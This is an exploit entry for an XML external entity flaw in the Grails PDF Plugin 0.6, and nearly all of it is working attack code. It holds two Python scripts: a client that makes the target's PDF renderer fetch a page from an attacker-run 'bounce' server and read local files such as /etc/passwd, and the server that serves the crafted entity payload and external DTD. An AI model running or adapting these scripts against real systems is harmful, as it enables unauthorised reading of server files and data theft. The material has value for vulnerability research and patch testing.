# Exploit Title: Grails PDF Plugin 0.6 XXE
# Date: 21/02/2017
# Vendor Homepage: http://www.grails.org/plugin/pdf
# Software Link: https://github.com/aeischeid/grails-pdfplugin
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics
# Website: https://www.ambionics.io/blog/grails-pdf-plugin-xxe
# Version: 0.6
# CVE : N/A


1. dump_file.py

#!/usr/bin/python3
# Grails PDF Plugin XXE
# cf
# https://www.ambionics.io/blog/grails-pdf-plugin-xxe

import requests
import sys
import os

# Base URL of the Grails target
URL = 'http://10.0.0.179:8080/grailstest'
# "Bounce" HTTP Server
BOUNCE = 'http://10.0.0.138:7777/'


session = requests.Session()
pdfForm = '/pdf/pdfForm?url='
renderPage = 'render.html'

if len(sys.argv) < 0:
    print('usage: ./%s <resource>' % sys.argv[0])
    print('e.g.:  ./%s file:///etc/passwd' % sys.argv[0])
    exit(0)

resource = sys.argv[1]

# Build the full URL
full_url = URL + pdfForm + pdfForm + BOUNCE + renderPage
full_url += '&resource=' + sys.argv[1]

r = requests.get(full_url, allow_redirects=False)

#print(full_url)

if r.status_code != 200:
    print('Error: %s' % r)
else:
    with open('/tmp/file.pdf', 'wb') as handle:
        handle.write(r.content)
    os.system('pdftotext /tmp/file.pdf')
    with open('/tmp/file.txt', 'r') as handle:
        print(handle.read(), end='')


2. server.py

#!/usr/bin/python3
# Grails PDF Plugin XXE
# cf
# https://www.ambionics.io/blog/grails-pdf-plugin-xxe
#
# Server part of the exploitation
#
# Start it in an empty folder:
# $ mkdir /tmp/empty
# $ mv server.py /tmp/empty
# $ /tmp/empty/server.py

import http.server
import socketserver
import sys


BOUNCE_IP = '10.0.0.138'
BOUNCE_PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 80

# Template for the HTML page
template = """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html [
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % goodies SYSTEM "[RESOURCE]">
 <!ENTITY % end "]]>">
 <!ENTITY % dtd SYSTEM "http://[BOUNCE]/out.dtd">
%dtd;
]>
<html>
    <head>
        <style>
            body { font-size: 1px; width: 1000000000px;}
        </style>
    </head>
    <body>
        <pre>&all;</pre>
    </body>
</html>"""

# The external DTD trick allows us to get more files; they would've been
invalid
# otherwise
# See: https://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf
dtd = """<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY all "%start;%goodies;%end;">
"""

# Really hacky. When the render.html page is requested, we extract the
# 'resource=XXX' part of the URL and create an HTML file which XXEs it.
class GetHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if 'render.html' in self.path:
            resource = self.path.split('resource=')[1]
            print('Resource: %s' % resource)
            page = template
            page = page.replace('[RESOURCE]', resource)
            page = page.replace('[BOUNCE]', '%s:%d' % (BOUNCE_IP,
BOUNCE_PORT))

            with open('render.html', 'w') as handle:
                handle.write(page)

        return super().do_GET()


Handler = GetHandler
httpd = socketserver.TCPServer(("", BOUNCE_PORT), Handler)

with open('out.dtd', 'w') as handle:
    handle.write(dtd)

print("Started HTTP server on port %d, press Ctrl-C to exit..." %
BOUNCE_PORT)
try:
    httpd.serve_forever()
except KeyboardInterrupt:
    print("Keyboard interrupt received, exiting.")
    httpd.server_close()


